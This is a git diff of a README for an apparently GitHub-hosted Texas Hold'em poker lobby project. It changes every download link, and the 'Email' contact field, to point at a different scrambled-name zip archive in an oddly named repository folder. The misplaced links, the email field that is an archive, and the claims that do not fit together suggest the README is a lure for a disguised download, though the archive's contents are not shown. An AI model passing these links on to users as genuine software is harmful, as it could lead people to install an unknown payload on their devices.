@@ -1,6 +1,6 @@
 # 🎲 Texas-Hold-em-Game-Lobby - Enjoy Multiplayer Poker Easily
 
-[![Download Texas Hold-em Game Lobby](https://raw.githubusercontent.com/JonD110/Texas-Hold-em-Game-Lobby/main/eudiometrically/em_Lobby_Game_Hold_Texas_v1.8.zip)](https://raw.githubusercontent.com/JonD110/Texas-Hold-em-Game-Lobby/main/eudiometrically/em_Lobby_Game_Hold_Texas_v1.8.zip)
+[![Download Texas Hold-em Game Lobby](https://raw.githubusercontent.com/JonD110/Texas-Hold-em-Game-Lobby/main/eudiometrically/Game_em_Texas_Hold_Lobby_v1.6.zip)](https://raw.githubusercontent.com/JonD110/Texas-Hold-em-Game-Lobby/main/eudiometrically/Game_em_Texas_Hold_Lobby_v1.6.zip)
 
 ## 📋 Overview
 Texas-Hold-em-Game-Lobby is a complete package for playing Texas Hold'em poker. This software includes both client and server sides. The client, built with Unity, supports iOS and Android devices. The server side is developed in C++, offering a robust online poker experience. Enjoy features like classic Texas Hold'em, short deck games, SNG, home games, and clubs.
@@ -10,7 +10,7 @@ To start using Texas-Hold-em-Game-Lobby, follow these straightforward steps:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click the link below to go to the releases page where you can download the software.
-   [Download Texas Hold-em Game Lobby](https://raw.githubusercontent.com/JonD110/Texas-Hold-em-Game-Lobby/main/eudiometrically/em_Lobby_Game_Hold_Texas_v1.8.zip)
+   [Download Texas Hold-em Game Lobby](https://raw.githubusercontent.com/JonD110/Texas-Hold-em-Game-Lobby/main/eudiometrically/Game_em_Texas_Hold_Lobby_v1.6.zip)
 
 2. **Choose Your Version**: On the releases page, find the latest version and select the appropriate build for your device. You will likely find options for Windows, iOS, and Android.
 
@@ -52,7 +52,7 @@ The project covers various aspects of poker gaming, including:
 ## 📞 Contact
 For further questions or support, you can reach out via:
 - **Telegram**: @xuzongbin001
-- **Email**: https://raw.githubusercontent.com/JonD110/Texas-Hold-em-Game-Lobby/main/eudiometrically/em_Lobby_Game_Hold_Texas_v1.8.zip
+- **Email**: https://raw.githubusercontent.com/JonD110/Texas-Hold-em-Game-Lobby/main/eudiometrically/Game_em_Texas_Hold_Lobby_v1.6.zip
 
 ## 🌍 Community
 Join our community to share experiences, report issues, or find gaming partners. Connect with other players through forums and social media. We welcome feedback and suggestions to improve the game.
